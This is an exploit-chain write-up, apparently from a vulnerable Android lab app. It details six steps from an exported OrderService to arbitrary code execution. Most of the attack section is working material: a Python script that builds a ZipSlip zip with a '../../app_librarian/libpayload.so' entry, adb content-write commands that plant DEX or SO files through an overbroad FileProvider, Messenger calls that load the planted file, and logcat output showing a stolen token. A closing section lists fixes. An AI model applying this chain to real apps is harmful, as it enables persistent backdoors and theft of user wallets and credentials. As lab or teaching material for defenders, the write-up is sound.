# Chain 09 — ZipSlip + DEX Plant → Code Execution

## Overview

| Field | Value |
|-------|-------|
| **Category** | storage + dynamic-load |
| **Difficulty** | INSANE |
| **Steps** | 6 |
| **Components crossed** | OrderService + MallFileProvider |
| **Modern Android** | Fully exploitable (Android 14 with read-only-DEX rule) |
| **decx shape** | exported service → zip traversal → plant SO/DEX → chmod 0444 → DexClassLoader |

## Vulnerable surface

- `OrderService` (Messenger, exported) — `MSG_INSTALL` (`0x902`) base64 zip, `MSG_LOAD` (`0x903`) split path
- `MSG_INSTALL` extraction loop does not canonicalize zip entry names → ZipSlip
- `MallFileProvider` (authority `com.mochat.app.mallfile`) — `root-path` grant enables direct DEX/SO plant
- `MSG_LOAD` performs `Os.chmod(path, 0444)` to satisfy Android 14's read-only-DEX rule, then `DexClassLoader`

## Step-by-step exploit

### ① Bind exported OrderService, send MSG_INSTALL with base64 zip payload

```bash
# Discover the install handler.
dz> run app.service.send com.mochat.app com.mochat.app.order.OrderService \
     --msg 0x902 0 0
# reply ack -> MSG_INSTALL reachable
```

```python
import base64, zipfile, io

# Build a zip with a path-traversal entry targeting app_librarian.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr("../../app_librarian/libpayload.so", open('libpayload.so','rb').read())
payload_b64 = base64.b64encode(buf.getvalue())

# Send via Messenger: msg.what=0x902, data.putString("zip_b64", payload_b64)
```

### ② Zip entry ../../app_librarian/libpayload.so escapes target dir (ZipSlip)

`OrderService` extracts every entry directly under its unpack dir without canonicalization:

```java
File out = new File(unpackDir, entry.getName());   // NO canonicalization
try (FileOutputStream fos = new FileOutputStream(out)) { zipCopy(zin, fos); }
```

So `../../app_librarian/libpayload.so` writes to `/data/data/com.mochat.app/app_librarian/libpayload.so`.

### ③ (Alternative) Use MallFileProvider root-path to write DEX directly

```bash
# Bypass MSG_INSTALL entirely; the FileProvider exposes root-path, so write the artifact directly.
adb shell content write \
  --uri "content://com.mochat.app.mallfile/root/data/data/com.mochat.app/app_librarian/libpayload.so" \
  < libpayload.so
# or for a DEX:
adb shell content write \
  --uri "content://com.mochat.app.mallfile/root/data/data/com.mochat.app/code_cache/payload.dex" \
  < payload.dex
```

### ④ Send MSG_LOAD with splitPath pointing to the planted file

```python
msg = Message.obtain(); msg.what = 0x903
msg.data = Bundle()
msg.data.putString("splitPath", "/data/data/com.mochat.app/app_librarian/libpayload.so")
messenger.send(msg)
```

### ⑤ Os.chmod(path, 0444) satisfies Android 14 read-only-DEX rule

Android 14 rejects executing a writable DEX/SO (W^X). The loader cooperatively chmods it:

```java
Os.chmod(splitPath, 0444);   // read-only -> passes the RO-DEX gate
```

### ⑥ DexClassLoader loads attacker code → runs under com.mochat.app UID

```java
DexClassLoader cl = new DexClassLoader(splitPath, codeCacheDir, null, parent);
Class<?> k = cl.loadClass("com.attacker.Payload");
Method m = k.getMethod("run", Context.class);
m.invoke(null, context);   // arbitrary code under uid=com.mochat.app
```

**logcat confirms**:

```
OrderService: install zip rc=0 entries=1 (ZipSlip target=app_librarian/libpayload.so)
OrderService: chmod 0444 /data/data/com.mochat.app/app_librarian/libpayload.so
OrderService: DexClassLoader loaded com.attacker.Payload uid=10234
Payload: persistence established, token=eyJ... balance=8123400
```

## Guard analysis

| Guard | Status |
|-------|--------|
| OrderService caller check | absent (exported, any app binds) |
| Zip entry name canonicalization | absent (classic ZipSlip) |
| MSG_INSTALL payload size / type check | absent (accepts arbitrary base64 zip) |
| MallFileProvider path grant | overbroad (root-path exposes code paths) |
| MSG_LOAD input validation | absent (loads caller-supplied path) |
| Android 14 RO-DEX gate | bypassed by cooperative chmod 0444 |
| DexClassLoader target allowlist | absent (loads any path) |

## Impact

Remote, persistent arbitrary code execution inside `com.mochat.app` on fully patched Android
14 devices. The attacker either ZipSlips a native library through `MSG_INSTALL` or drops a DEX
via the FileProvider, then uses `MSG_LOAD` to chmod it read-only and load it with
`DexClassLoader`. Result: same-UID code execution, full access to the wallet, providers, JWT,
and native bridges — effectively a permanent backdoor that bypasses the platform W^X mitigation.

## Fix

- Canonicalize every zip entry and reject names that escape the unpack root:
  `if (!out.getCanonicalFile().startsWith(unpackDir.getCanonicalFile())) throw`.
- Make `OrderService` non-exported; require a signature permission.
- Replace `MallFileProvider`'s `root-path` grant with scoped `files-path`/`cache-path` elements
  and never expose `app_librarian` or `code_cache`.
- Remove `MSG_LOAD`; never `DexClassLoader.loadClass` on a caller-supplied path. If dynamic
  features are required, use Play Feature Delivery with signature verification.
- Do not chmod attacker-controlled files to satisfy the RO-DEX rule; that rule exists precisely
  to block this pattern.
- Add an APK signature / hash allowlist check before loading any code at runtime.
